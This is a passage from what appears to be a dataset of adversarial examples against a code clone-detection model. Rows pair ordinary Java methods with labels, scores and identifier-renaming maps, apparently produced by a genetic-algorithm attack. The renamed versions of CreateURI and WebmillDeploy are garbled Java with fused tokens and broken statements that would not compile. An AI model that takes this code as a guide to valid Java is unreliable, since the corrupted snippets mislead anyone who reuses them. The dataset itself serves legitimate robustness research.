                    if (!altres.trim().equals("""")) {
                        rem = remitente;
                    } else {
                        javax.naming.InitialContext contexto = new javax.naming.InitialContext();
                        Object ref = contexto.lookup(""es.caib.regweb.ValoresHome"");
                        ValoresHome home = (ValoresHome) javax.rmi.PortableRemoteObject.narrow(ref, ValoresHome.class);
                        Valores valor = home.create();
                        rem = valor.recuperaRemitenteCastellano(entidad1Old, entidad2Old + """");
                        valor.remove();
                    }
                }
                if (hayVisadoExtracto) {
                    com = extracto;
                } else {
                    com = comentario;
                }
                try {
                    Class t = Class.forName(""es.caib.regweb.module.PluginHook"");
                    Class[] partypes = { String.class, Integer.class, Integer.class, Integer.class, Integer.class, String.class, String.class, String.class, Integer.class, Integer.class, String.class, Integer.class, String.class };
                    Object[] params = { ""V"", new Integer(anoSalida), new Integer(numeroRegistro), new Integer(oficina), new Integer(fechaDocumento), rem, com, tipoDocumento, new Integer(fechaRegistro), new Integer(fzacagge), fora, new Integer(destinatario), idioma };
                    java.lang.reflect.Method metodo = t.getMethod(""salida"", partypes);
                    metodo.invoke(null, params);
                } catch (IllegalAccessException iae) {
                } catch (IllegalArgumentException iae) {
                } catch (InvocationTargetException ite) {
                } catch (NullPointerException npe) {
                } catch (ExceptionInInitializerError eiie) {
                } catch (NoSuchMethodException nsme) {
                } catch (SecurityException se) {
                } catch (LinkageError le) {
                } catch (ClassNotFoundException le) {
                }
            }
            conn.commit();
            int fzahsis = Integer.parseInt(hhmmss.format(fechaSystem) + ss);
            String Stringsss = sss.format(fechaSystem);
            switch(Stringsss.length()) {
                case (1):
                    Stringsss = ""00"" + Stringsss;
                    break;
                case (2):
                    Stringsss = ""0"" + Stringsss;
                    break;
            }
            int horamili = Integer.parseInt(hhmmss.format(fechaSystem) + Stringsss);
            int fzafsis = Integer.parseInt(aaaammdd.format(fechaSystem));
            logLopdBZMODIF(""UPDATE"", sessioEjb.getCallerPrincipal().getName().toUpperCase(), fzafsis, horamili, 'S', numeroRegistro, anoSalida, oficina, Integer.parseInt(fechaModificacion), Integer.parseInt(horaModificacion));
        } catch (Exception e) {
            System.out.println(""Error: "" + e.getMessage());
            e.printStackTrace();
            visado = false;
            try {
                if (conn != null) conn.rollback(); else System.out.println(""ERROR: No es pot fer rollback sense connexió!"");
            } catch (Exception ex) {
                System.out.println(""Error: "" + e.getMessage());
                ex.printStackTrace();
            }
        } finally {
            ToolsBD.closeConn(conn, ps, null);
        }
        return visado;
    }
",116,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,sourceFile,destFile,source,destination",,,,0,,0,GA,1809,0.728615915775299,failed,[]
130,"    public static Document ByURL(String urlstr) throws IOException {
        String uri = urlstr;
        URL url = new URL(uri);
        URLConnection connection = url.openConnection();
        InputStream in = connection.getInputStream();
        Reader reader = new InputStreamReader(in);
        InputSource is = new InputSourceImpl(reader, uri);
        System.out.println(is.toString());
        Document document = new Document() {

            @Override
            public Node adoptNode(Node source) throws DOMException {
                return null;
            }

            @Override
            public Attr createAttribute(String name) throws DOMException {
                return null;
            }

            @Override
            public Attr createAttributeNS(String namespaceURI, String qualifiedName) throws DOMException {
                return null;
            }

            @Override
            public CDATASection createCDATASection(String data) throws DOMException {
                return null;
            }

            @Override
            public Comment createComment(String data) {
                return null;
            }

            @Override
            public DocumentFragment createDocumentFragment() {
                return null;
            }

            @Override
            public Element createElement(String tagName) throws DOMException {
                return null;
            }

            @Override
            public Element createElementNS(String namespaceURI, String qualifiedName) throws DOMException {
                return null;
            }

            @Override
            public EntityReference createEntityReference(String name) throws DOMException {
                return null;
            }

            @Override
            public ProcessingInstruction createProcessingInstruction(String target, String data) throws DOMException {
                return null;
            }

            @Override
            public Text createTextNode(String data) {
                return null;
            }

            @Override
            public DocumentType getDoctype() {
                return null;
            }

            @Override
            public Element getDocumentElement() {
                return null;
            }

            @Override
            public String getDocumentURI() {
                return null;
            }

            @Override
            public DOMConfiguration getDomConfig() {
                return null;
            }

            @Override
            public Element getElementById(String elementId) {
                return null;
            }

            @Override
            public NodeList getElementsByTagName(String tagname) {
                return null;
            }

            @Override
            public NodeList getElementsByTagNameNS(String namespaceURI, String localName) {
                return null;
            }

            @Override
            public DOMImplementation getImplementation() {
                return null;
            }

            @Override
            public String getInputEncoding() {
                return null;
            }

            @Override
            public boolean getStrictErrorChecking() {
                return false;
            }

            @Override
            public String getXmlEncoding() {
                return null;
            }

            @Override
            public boolean getXmlStandalone() {
                return false;
            }

            @Override
            public String getXmlVersion() {
                return null;
            }

            @Override
            public Node importNode(Node importedNode, boolean deep) throws DOMException {
                return null;
            }

            @Override
            public void normalizeDocument() {
            }

            @Override
            public Node renameNode(Node n, String namespaceURI, String qualifiedName) throws DOMException {
                return null;
            }

            @Override
            public void setDocumentURI(String documentURI) {
            }

            @Override
            public void setStrictErrorChecking(boolean strictErrorChecking) {
            }

            @Override
            public void setXmlStandalone(boolean xmlStandalone) throws DOMException {
            }

            @Override
            public void setXmlVersion(String xmlVersion) throws DOMException {
            }

            public Node appendChild(Node arg0) throws DOMException {
                return null;
            }

            public Node cloneNode(boolean arg0) {
                return null;
            }

            public short compareDocumentPosition(Node arg0) throws DOMException {
                return 0;
            }

            public NamedNodeMap getAttributes() {
                return null;
            }

            public String getBaseURI() {
                return null;
            }

            public NodeList getChildNodes() {
                return null;
            }

            public Object getFeature(String arg0, String arg1) {
                return null;
            }

            public Node getFirstChild() {
                return null;
            }

            public Node getLastChild() {
                return null;
            }

            public String getLocalName() {
                return null;
            }

            public String getNamespaceURI() {
                return null;
            }

            public Node getNextSibling() {
                return null;
            }

            public String getNodeName() {
                return null;
            }

            public short getNodeType() {
                return 0;
            }

            public String getNodeValue() throws DOMException {
                return null;
            }

            public Document getOwnerDocument() {
                return null;
            }

            public Node getParentNode() {
                return null;
            }

            public String getPrefix() {
                return null;
            }

            public Node getPreviousSibling() {
                return null;
            }

            public String getTextContent() throws DOMException {
                return null;
            }

            public Object getUserData(String arg0) {
                return null;
            }

            public boolean hasAttributes() {
                return false;
            }

            public boolean hasChildNodes() {
                return false;
            }

            public Node insertBefore(Node arg0, Node arg1) throws DOMException {
                return null;
            }

            public boolean isDefaultNamespace(String arg0) {
                return false;
            }

            public boolean isEqualNode(Node arg0) {
                return false;
            }

            public boolean isSameNode(Node arg0) {
                return false;
            }

            public boolean isSupported(String arg0, String arg1) {
                return false;
            }

            public String lookupNamespaceURI(String arg0) {
                return null;
            }

            public String lookupPrefix(String arg0) {
                return null;
            }

            public void normalize() {
            }

            public Node removeChild(Node arg0) throws DOMException {
                return null;
            }

            public Node replaceChild(Node arg0, Node arg1) throws DOMException {
                return null;
            }

            public void setNodeValue(String arg0) throws DOMException {
            }

            public void setPrefix(String arg0) throws DOMException {
            }

            public void setTextContent(String arg0) throws DOMException {
            }

            public Object setUserData(String arg0, Object arg1, UserDataHandler arg2) {
                return null;
            }
        };
        return document;
    }
 <SPLIT>     public void testReadHelloWorldTxt() throws Exception {
        final InputStream helloWorldIS = this.getClass().getClassLoader().getResourceAsStream(BASE_DIR + ""/HelloWorld.txt"");
        FileUtils.forceMkdir(new File(this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver""));
        final String helloWorldPath = this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver/HelloWorld.txt"";
        final FileOutputStream fileOutputStream = new FileOutputStream(new File(helloWorldPath));
        IOUtils.copy(helloWorldIS, fileOutputStream);
        IOUtils.closeQuietly(helloWorldIS);
        IOUtils.closeQuietly(fileOutputStream);
        LOG.info(""helloWorldPath: "" + helloWorldPath);
        final FSContentResolver contentResolver = new FSContentResolver();
        contentResolver.setRootFolderPath(this.testDir.getAbsolutePath());
        byte[] content = contentResolver.getContent(""org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:laksjdhalksdhfa"");
        assertNull(content);
        content = contentResolver.getContent(""/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
    }
",963,"    public static Document CreateURI(String URLSTR) throws IOException {
        String iri = URLSTR;
        URL system = new URL(iri);
        URLConnection conconnectionsystem.openConnection();
        InputStream stream = connection.getInputStream();
        Reader readreaderew InputStreamReader(stream);
        InputSource os = new InputSourceImpl(reader, iri);
        System.out.println(os.toString());
        Document ocument = new Document() {

            @Override
            public Node adoptNode(Node parser) throws DOMException {
                return null;
            }

            @Override
            public Attr createAttribute(String root) throws DOMException {
                return null;
            }

            @Override
            public Attr createAttributeNS(String namespacesMI, String fixedType) throws DOMException {
                return null;
            }

            @Override
            public CDATASection createCDATASection(String text) throws DOMException {
                return null;
            }

            @Override
            public Comment createComment(String text) {
                return null;
            }

            @Override
            public DocumentFragment createDocumentFragment() {
                return null;
            }

            @Override
            public Element createElement(String tagName) throws DOMException {
                return null;
            }

            @Override
            public Element createElementNS(String namespacesMI, String fixedType) throws DOMException {
                return null;
            }

            @Override
            public EntityReference createEntityReference(String root) throws DOMException {
                return null;
            }

            @Override
            public ProcessingInstruction createProcessingInstruction(String node, String text) throws DOMException {
                return null;
            }

            @Override
            public Text createTextNode(String text) {
                return null;
            }

            @Override
            public DocumentType getDoctype() {
                return null;
            }

            @Override
            public Element getDocumentElement() {
                return null;
            }

            @Override
            public String getDocumentURI() {
                return null;
            }

            @Override
            public DOMConfiguration getDomConfig() {
                return null;
            }

            @Override
            public Element getElementById(String objectID) {
                return null;
            }

            @Override
            public NodeList getElementsByTagName(String tagNAME) {
                return null;
            }

            @Override
            public NodeList getElementsByTagNameNS(String namespacesMI, String  localname) {
                return null;
            }

            @Override
            public DOMImplementation getImplementation() {
                return null;
            }

            @Override
            public String getInputEncoding() {
                return null;
            }

            @Override
            public boolean getStrictErrorChecking() {
                return false;
            }

            @Override
            public String getXmlEncoding() {
                return null;
            }

            @Override
            public boolean getXmlStandalone() {
                return false;
            }

            @Override
            public String getXmlVersion() {
                return null;
            }

            @Override
            public Node importNode(Node importedNode, boolean deep) throws DOMException {
                return null;
            }

            @Override
            public void normalizeDocument() {
            }

            @Override
            public Node renameNode(Node n, String namespacesMI, String fixedType) throws DOMException {
                return null;
            }

            @Override
            public void setDocumentURI(String documentURI) {
            }

            @Override
            public void setStrictErrorChecking(boolean strictErrorChecking) {
            }

            @Override
            public void setXmlStandalone(boolean xmlStandalone) throws DOMException {
            }

            @Override
            public void setXmlVersion(String xmlVersion) throws DOMException {
            }

            public Node appendChild(Node arg0) throws DOMException {
                return null;
            }

            public Node cloneNode(boolean arg0) {
                return null;
            }

            public short compareDocumentPosition(Node arg0) throws DOMException {
                return 0;
            }

            public NamedNodeMap getAttributes() {
                return null;
            }

            public String getBaseURI() {
                return null;
            }

            public NodeList getChildNodes() {
                return null;
            }

            public Object getFeature(String arg0, String arg1) {
                return null;
            }

            public Node getFirstChild() {
                return null;
            }

            public Node getLastChild() {
                return null;
            }

            public String getLocalName() {
                return null;
            }

            public String getNamespaceURI() {
                return null;
            }

            public Node getNextSibling() {
                return null;
            }

            public String getNodeName() {
                return null;
            }

            public short getNodeType() {
                return 0;
            }

            public String getNodeValue() throws DOMException {
                return null;
            }

            public Document getOwnerDocument() {
                return null;
            }

            public Node getParentNode() {
                return null;
            }

            public String getPrefix() {
                return null;
            }

            public Node getPreviousSibling() {
                return null;
            }

            public String getTextContent() throws DOMException {
                return null;
            }

            public Object getUserData(String arg0) {
                return null;
            }

            public boolean hasAttributes() {
                return false;
            }

            public boolean hasChildNodes() {
                return false;
            }

            public Node insertBefore(Node arg0, Node arg1) throws DOMException {
                return null;
            }

            public boolean isDefaultNamespace(String arg0) {
                return false;
            }

            public boolean isEqualNode(Node arg0) {
                return false;
            }

            public boolean isSameNode(Node arg0) {
                return false;
            }

            public boolean isSupported(String arg0, String arg1) {
                return false;
            }

            public String lookupNamespaceURI(String arg0) {
                return null;
            }

            public String lookupPrefix(String arg0) {
                return null;
            }

            public void normalize() {
            }

            public Node removeChild(Node arg0) throws DOMException {
                return null;
            }

            public Node replaceChild(Node arg0, Node arg1) throws DOMException {
                return null;
            }

            public void setNodeValue(String arg0) throws DOMException {
            }

            public void setPrefix(String arg0) throws DOMException {
            }

            public void setTextContent(String arg0) throws DOMException {
            }

            public Object setUserData(String arg0, Object arg1, UserDataHandler arg2) {
                return null;
            }
        };
        return ocument;
    }
",LABEL_0,LABEL_0,0.5109080672264099,1,"ByURL,urlstr,uri,url,connection,in,reader,is,document,source,name,namespaceURI,qualifiedName,data,tagName,target,elementId,tagname,localName",,,,5,"ByURL:CreateURI,urlstr:URLSTR,uri:iri,url:system,connection:connection,in:stream,reader:reader,is:os,document:ocument,source:parser,name:root,namespaceURI:namespacesMI,qualifiedName:fixedType,data:text,tagName:tagName,target:node,elementId:objectID,tagname:tagNAME,localName: localname,",3,GA,1581,0.7127687851587932,ga,[]
131,"    private void addQDInformation() {
        try {
            long qdDate = System.currentTimeMillis();
            if (_local == true) {
                File qdFile = new File(""qdinfo.dat"");
                if (!qdFile.exists()) {
                    return;
                }
                qdDate = qdFile.lastModified();
            }
            if (qdDate > this._qdFileDate) {
                this._qdFileDate = qdDate;
                for (int ii = 0; ii < this._projectInfo.size(); ii++) {
                    Information info = getInfo(ii);
                    if (info != null) {
                        info._qdValue = null;
                    }
                }
                Reader reader = null;
                if (_local == true) {
                    reader = new FileReader(""qdinfo.dat"");
                } else {
                    StringBuffer urlName = new StringBuffer();
                    urlName.append(""http://boston.quik.com/rph/"");
                    urlName.append(""qdinfo.dat"");
                    try {
                        URL url = new URL(urlName.toString());
                        InputStream stream = url.openStream();
                        reader = new InputStreamReader(stream);
                    } catch (MalformedURLException mue) {
                        mue.printStackTrace();
                    }
                }
                BufferedReader file = new BufferedReader(reader);
                try {
                    String line = null;
                    while ((line = file.readLine()) != null) {
                        if (line.startsWith(""pg "")) {
                            this._qdDate = Long.parseLong(line.substring(3), 16);
                            this._qdDate = (this._qdDate + 946684800) * 1000;
                        } else if (line.startsWith(""pt "")) {
                            line = line.substring(3).trim();
                            int pos = -1;
                            while ((line.length() > 0) && ((pos = line.indexOf(' ')) > 0)) {
                                int projectNum = 0;
                                Double value = null;
                                if (pos > 0) {
                                    projectNum = Integer.parseInt(line.substring(0, pos));
                                    line = line.substring(pos).trim();
                                }
                                pos = line.indexOf(' ');
                                if (pos > 0) {
                                    value = new Double((double) Integer.parseInt(line.substring(0, pos)) / 100);
                                    line = line.substring(pos).trim();
                                }
                                Information info = getInfo(projectNum);
                                if (info == null) {
                                    info = createInfo(projectNum);
                                }
                                if (info._qdValue == null) {
                                    info._qdValue = value;
                                }
                            }
                        }
                    }
                } finally {
                    file.close();
                }
            }
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        }
    }
 <SPLIT>     public static Model downloadModel(String url) {
        Model model = ModelFactory.createDefaultModel();
        try {
            URLConnection connection = new URL(url).openConnection();
            if (connection instanceof HttpURLConnection) {
                HttpURLConnection httpConnection = (HttpURLConnection) connection;
                httpConnection.setRequestProperty(""Accept"", ""application/rdf+xml, */*;q=.1"");
                httpConnection.setRequestProperty(""Accept-Language"", ""en"");
            }
            InputStream in = connection.getInputStream();
            model.read(in, url);
            in.close();
            return model;
        } catch (MalformedURLException e) {
            cat.debug(""Unable to download model from "" + url, e);
            throw new RuntimeException(e);
        } catch (IOException e) {
            cat.debug(""Unable to download model from "" + url, e);
            throw new RuntimeException(e);
        }
    }
",522,,LABEL_0,LABEL_0,LABEL_0,-1,"addQDInformation,qdDate,qdFile,_qdFileDate,ii,info,_qdValue,reader,urlName,url,stream,file,line,_qdDate,pos,projectNum,value",,,,0,,0,GA,6313,2.4543150901794433,failed,[]
132,"    public WebmillDeploy(String inputName, String outputName, boolean stripLoggers) throws Exception {
        File tempFile = null;
        JarFile jin = null;
        JarOutputStream jout = null;
        FileChannel srcChannel = null;
        FileChannel dstChannel = null;
        try {
            String portletApplicationName = getPortletApplicationName(outputName);
            System.out.println(""portletApplicationName = "" + portletApplicationName);
            tempFile = File.createTempFile(""webmill-delpoy-"", """");
            tempFile.deleteOnExit();
            jin = new JarFile(inputName);
            jout = new JarOutputStream(new FileOutputStream(tempFile));
            Document webXml = null;
            Document portletXml = null;
            Document contextXml = null;
            ZipEntry src;
            InputStream source;
            Enumeration zipEntries = jin.entries();
            while (zipEntries.hasMoreElements()) {
                src = (ZipEntry) zipEntries.nextElement();
                source = jin.getInputStream(src);
                try {
                    String target = src.getName();
                    if (WEB_INF_WEB_XML.equals(target)) {
                        System.out.println(""Found web.xml"");
                        webXml = parseXml(source);
                    } else if (WEB_INF_PORTLET_XML.equals(target)) {
                        System.out.println(""Found WEB-INF/portlet.xml"");
                        portletXml = parseXml(source);
                    } else if (META_INF_CONTEXT_XML.equals(target)) {
                        System.out.println(""Found META-INF/context.xml"");
                        contextXml = parseXml(source);
                    }
                } finally {
                    source.close();
                }
            }
            if (webXml == null) {
                throw new IllegalArgumentException(""WEB-INF/web.xml not found"");
            }
            if (portletXml == null) {
                throw new IllegalArgumentException(""WEB-INF/portlet.xml not found"");
            }
            WebmillWebApplicationRewriter webRewriter = new WebmillWebApplicationRewriter(webXml);
            webRewriter.processWebXML();
            WebmillContextRewriter contextRewriter = new WebmillContextRewriter(contextXml, portletApplicationName);
            contextRewriter.processContextXML();
            jin = new JarFile(inputName);
            zipEntries = jin.entries();
            while (zipEntries.hasMoreElements()) {
                src = (ZipEntry) zipEntries.nextElement();
                source = jin.getInputStream(src);
                try {
                    String target = src.getName();
                    String fullTarget = '/' + target;
                    if (stripLoggers && target.endsWith("".jar"") && (target.startsWith(""WEB-INF/lib/commons-logging"") || target.startsWith(""WEB-INF/lib/log4j""))) {
                        System.out.println(""Skip logger "" + target);
                        continue;
                    } else {
                        if (webRewriter.getRealPortletTldFile() != null && fullTarget.equals(webRewriter.getRealPortletTldFile())) {
                            System.out.println(""Skip portlet tld file "" + fullTarget);
                            continue;
                        } else if (target.equals(WEB_INF_WEB_XML)) {
                            System.out.println(""Skip web.xml file "" + target);
                            continue;
                        } else if (target.equals(WEB_INF_PORTLET_XML)) {
                            System.out.println(""Skip portlet.xml file "" + target);
                            continue;
                        } else if (target.equals(META_INF_CONTEXT_XML)) {
                            System.out.println(""Skip context.xml file "" + target);
                            continue;
                        }
                        System.out.println(""Add file "" + target);
                    }
                    addFile(target, source, jout);
                } finally {
                    source.close();
                }
            }
            addFile(WEB_INF_WEB_XML, webXml, jout);
            addFile(WEB_INF_PORTLET_XML, portletXml, jout);
            addFile(META_INF_CONTEXT_XML, contextXml, jout);
            System.out.println(""Attempting to add portlet.tld to war..."");
            InputStream is = this.getClass().getResourceAsStream(""/org/riverock/webmill/container/tags/portlet.tld"");
            if (is == null) {
                System.out.println(""Failed to find portlet.tld in classpath"");
            } else {
                String portletTldFile = webRewriter.getRealPortletTldFile();
                if (portletTldFile.charAt(0) == '/') {
                    portletTldFile = portletTldFile.substring(1);
                }
                System.out.println(""Adding file "" + portletTldFile);
                try {
                    addFile(portletTldFile, is, jout);
                } finally {
                    is.close();
                }
            }
            jout.close();
            jin.close();
            jin = null;
            jout = null;
            System.out.println(""Creating war "" + outputName + "" ..."");
            System.out.flush();
            srcChannel = new FileInputStream(tempFile).getChannel();
            dstChannel = new FileOutputStream(outputName).getChannel();
            dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
            srcChannel.close();
            srcChannel = null;
            dstChannel.close();
            dstChannel = null;
            tempFile.delete();
            tempFile = null;
            System.out.println(""War "" + outputName + "" created"");
            System.out.flush();
        } finally {
            if (srcChannel != null && srcChannel.isOpen()) {
                try {
                    srcChannel.close();
                } catch (IOException e1) {
                }
            }
            if (dstChannel != null && dstChannel.isOpen()) {
                try {
                    dstChannel.close();
                } catch (IOException e1) {
                }
            }
            if (jin != null) {
                try {
                    jin.close();
                    jin = null;
                } catch (IOException e1) {
                }
            }
            if (jout != null) {
                try {
                    jout.close();
                    jout = null;
                } catch (IOException e1) {
                }
            }
            if (tempFile != null && tempFile.exists()) {
                tempFile.delete();
            }
        }
    }
 <SPLIT>     public String upload() {
        System.out.println(imgFile);
        String destDir = ""E:\\ganymede_workspace\\training01\\web\\user_imgs\\map_bg.jpg"";
        FileOutputStream fos;
        try {
            fos = new FileOutputStream(new File(destDir));
            IOUtils.copy(new FileInputStream(imgFile), fos);
            IOUtils.closeQuietly(fos);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return ""show"";
    }
",1028,"    public WebmillDeploy(String  inputFile, String applicationPath, boolean stripLoggers) throws Exception {
        File tempFile = null;
        JarFile john = null;
        JarOutputStream jOUT = null;
        FileChannel sourceChan = null;
        FileChannel  dstChan = null;
        try {
            String portlportalApplicationPathtPortletApplicationName(applicationPath);
            System.out.println(""portletApplicationName = "" + portalApplicationPath);
            tempFile = File.createTempFile(""webmill-delpoy-"", """");
            tempFile.deleteOnExit();
            jjohn= new JarFile( inputFile);
            jOUT = new JarOutputStream(new FileOutputStream(tempFile));
            Document webxlass = null;
            Document portletXml = null;
            Document  contextAxla = null;
            ZipEntry url;
            InputStream driver;
            Enumeration zzipIntegrations= john.entries();
            while (zipIntegrations.hasMoreElements()) {
                url = (ZipEntry) zipIntegrations.nextElement();
                sdriver= john.getInputStream(url);
                try {
                    String it = url.getName();
                    if (WEB_INF_WEB_XML.equals(it)) {
                        System.out.println(""Found web.xml"");
                        webxlass = parseXml(driver);
                    } else if (WEB_INF_PORTLET_XML.equals(it)) {
                        System.out.println(""Found WEB-INF/portlet.xml"");
                        portletXml = parseXml(driver);
                    } else if (META_INF_CONTEXT_XML.equals(it)) {
                        System.out.println(""Found META-INF/context.xml"");
                         contextAxla = parseXml(driver);
                    }
                } finally {
                    driver.close();
                }
            }
            if (webxlass == null) {
                throw new IllegalArgumentException(""WEB-INF/web.xml not found"");
            }
            if (portletXml == null) {
                throw new IllegalArgumentException(""WEB-INF/portlet.xml not found"");
            }
            WebmillWebApplicationRewriter wewebRewrite new WebmillWebApplicationRewriter(webxlass);
            webRewrite.processWebXML();
            WebmillContextRewriter contextRewriter = new WebmillContextRewriter contextAxlal, portalApplicationPath);
            contextRewriter.processContextXML();
            jjohn= new JarFile( inputFile);
            zzipIntegrations= john.entries();
            while (zipIntegrations.hasMoreElements()) {
                url = (ZipEntry) zipIntegrations.nextElement();
                sdriver= john.getInputStream(url);
                try {
                    String it = url.getName();
                    String fullTarget = '/' + it;
                    if (stripLoggers && it.endsWith("".jar"") && (it.startsWith(""WEB-INF/lib/commons-logging"") || it.startsWith(""WEB-INF/lib/log4j""))) {
                        System.out.println(""Skip logger "" + it);
                        continue;
                    } else {
                        if (webRewrite.getRealPortletTldFile() != null && fullTarget.equals(webRewrite.getRealPortletTldFile())) {
                            System.out.println(""Skip portlet tld file "" + fullTarget);
                            continue;
                        } else if (it.equals(WEB_INF_WEB_XML)) {
                            System.out.println(""Skip web.xml file "" + it);
                            continue;
                        } else if (it.equals(WEB_INF_PORTLET_XML)) {
                            System.out.println(""Skip portlet.xml file "" + it);
                            continue;
                        } else if (it.equals(META_INF_CONTEXT_XML)) {
                            System.out.println(""Skip context.xml file "" + it);
                            continue;
                        }
                        System.out.println(""Add file "" + it);
                    }
                    addFile(it, driver, jOUT);
                } finally {
                    driver.close();
                }
            }
            addFile(WEB_INF_WEB_XML, webxlass, jOUT);
            addFile(WEB_INF_PORTLET_XML, portletXml, jOUT);
            addFile(META_INF_CONTEXT_XML,  contextAxla, jOUT);
            System.out.println(""Attempting to add portlet.tld to war..."");
            InputStream is = this.getClass().getResourceAsStream(""/org/riverock/webmill/container/tags/portlet.tld"");
            if (is == null) {
                System.out.println(""Failed to find portlet.tld in classpath"");
            } else {
                String portletTldFile = webRewrite.getRealPortletTldFile();
                if (portletTldFile.charAt(0) == '/') {
                    portletTldFile = portletTldFile.substring(1);
                }
                System.out.println(""Adding file "" + portletTldFile);
                try {
                    addFile(portletTldFile, is, jOUT);
                } finally {
                    is.close();
                }
            }
            jOUT.close();
            john.close();
            john = null;
            jOUT = null;
            System.out.println(""Creating war "" + applicationPath + "" ..."");
            System.out.flush();
            sourceChan = new FileInputStream(tempFile).getChannel();
            dstCh dstChanw FileOutputStream(applicationPath).getChannel();
             dstChan.transferFrom(sourceChan, 0, sourceChan.size());
            sourceChan.close();
            sourceChan = null;
             dstChan.close();
             dstChan = null;
            tempFile.delete();
            tempFile = null;
            System.out.println(""War "" + applicationPath + "" created"");
            System.out.flush();
        } finally {
            if (sourceChan != null && sourceChan.isOpen()) {
                try {
                    sourceChan.close();
                } catch (IOException e1) {
                }
            }
            if ( dstChan != null &&  dstChan.isOpen()) {
                try {
                     dstChan.close();
                } catch (IOException e1) {
                }
            }
            if (john != null) {
                try {
                    john.close();
                    john = null;
                } catch (IOException e1) {
                }
            }
            if (jOUT != null) {
                try {
                    jOUT.close();
                    jOUT = null;
                } catch (IOException e1) {
                }
            }
            if (tempFile != null && tempFile.exists()) {
                tempFile.delete();
            }
        }
    }
",LABEL_1,LABEL_1,0.8127820491790771,1,"inputName,outputName,stripLoggers,tempFile,jin,jout,srcChannel,dstChannel,portletApplicationName,webXml,portletXml,contextXml,src,source,zipEntries,target,webRewriter",,,,16,"inputName: inputFile,outputName:applicationPath,stripLoggers:stripLoggers,tempFile:tempFile,jin:john,jout:jOUT,srcChannel:sourceChan,dstChannel: dstChan,portletApplicationName:portalApplicationPath,webXml:webxlass,portletXml:portletXml,contextXml: contextAxla,src:url,source:driver,zipEntries:zipIntegrations,target:it,webRewriter:webRewrite,",3,GA,1780,0.7830718040466309,ga,[]
133,"    public String getUser() {
        try {
            HttpGet get = new HttpGet(""http://api.linkedin.com/v1/people/~"");
            consumer.sign(get);
            HttpClient client = new DefaultHttpClient();
            HttpResponse response = client.execute(get);
            if (response != null) {
                int statusCode = response.getStatusLine().getStatusCode();
                if (statusCode != 200) {
                    this.enviarMensaje(""Error: Usuario no autenticado en la red de Linkedin"");
                }
                StringBuffer sBuf = new StringBuffer();
                String linea;
                BufferedReader reader = new BufferedReader(new InputStreamReader(response.getEntity().getContent(), ""UTF-8""));
                while ((linea = reader.readLine()) != null) {
                    sBuf.append(linea);
                }
                reader.close();
                response.getEntity().consumeContent();
                get.abort();
                String salida = sBuf.toString();
                String user_firstname = salida.split(""</first-name>"")[0].split(""<first-name>"")[1];
                String user_lastname = salida.split(""</last-name>"")[0].split(""<last-name>"")[1];
                return user_firstname + "" "" + user_lastname;
            }
        } catch (UnsupportedEncodingException e) {
            this.enviarMensaje(""Error: Usuario no autenticado en la red de Linkedin"");
        } catch (IOException e) {
            this.enviarMensaje(""Error: Usuario no autenticado en la red de Linkedin"");
        } catch (OAuthMessageSignerException e) {
            this.enviarMensaje(""Error: Usuario no autenticado en la red de Linkedin"");
        } catch (OAuthExpectationFailedException e) {
            this.enviarMensaje(""Error: Usuario no autenticado en la red de Linkedin"");
        } catch (OAuthCommunicationException e) {
            this.enviarMensaje(""Error: Usuario no autenticado en la red de Linkedin"");
        }
        return null;
    }
 <SPLIT>     public static void main(String[] args) {
        try {
            URL url = new URL(""http://hostname:80"");
            URLConnection conn = url.openConnection();
            for (int i = 0; ; i++) {
                String headerName = conn.getHeaderFieldKey(i);
                String headerValue = conn.getHeaderField(i);
                if (headerName == null && headerValue == null) {
                    break;
                }
                if (headerName == null) {
                }
            }
        } catch (Exception e) {
        }
    }
",317,,LABEL_0,LABEL_0,LABEL_0,-1,"getUser,get,client,response,statusCode,sBuf,linea,reader,salida,user_firstname,user_lastname",,,,0,,0,GA,3979,1.4683913429578146,failed,[]
134,"    private void loadDDL() throws IOException {
        try {
            conn.createStatement().executeQuery(""SELECT * FROM overrides"").close();
        } catch (SQLException e) {
            Statement stmt = null;
            if (!e.getMessage().startsWith(ERR_MISSING_TABLE)) {
                LOG.fatal(SQL_ERROR, e);
                throw new IOException(""Error on initial data store read"", e);
            }
            String[] qry = { ""CREATE TABLE monitor (id INTEGER PRIMARY KEY NOT NULL, status VARCHAR(32) NOT NULL, next_update TIMESTAMP NOT NULL)"", ""CREATE TABLE overrides (id INT NOT NULL, title VARCHAR(255) NOT NULL, subtitle VARCHAR(255) NOT NULL, enable BOOLEAN NOT NULL DEFAULT TRUE, PRIMARY KEY(id))"", ""CREATE TABLE settings (var VARCHAR(32) NOT NULL, val VARCHAR(255) NOT NULL, PRIMARY KEY(var))"", ""INSERT INTO settings (var, val) VALUES ('schema', '1')"" };
            try {
                conn.setAutoCommit(false);
                stmt = conn.createStatement();
                for (String q : qry) stmt.executeUpdate(q);
                conn.commit();
            } catch (SQLException e2) {
                try {
                    conn.rollback();
                } catch (SQLException e3) {
                    LOG.fatal(SQL_ERROR, e3);
                }
                LOG.fatal(SQL_ERROR, e2);
                throw new IOException(""Error initializing data store"", e2);
            } finally {
                if (stmt != null) {
                    try {
                        stmt.close();
                    } catch (SQLException e4) {
                        LOG.fatal(SQL_ERROR, e4);
                        throw new IOException(""Unable to cleanup data store resources"", e4);
                    }
                }
                try {
                    conn.setAutoCommit(true);
                } catch (SQLException e3) {
                    LOG.fatal(SQL_ERROR, e3);
                    throw new IOException(""Unable to reset data store auto commit"", e3);
                }
            }
        }
        return;
    }
 <SPLIT>     public FileAttribute getAttribute(URL url) throws VFSException {
        try {
            con = (HttpURLConnection) url.openConnection();
            con.setInstanceFollowRedirects(false);
            int response = con.getResponseCode();
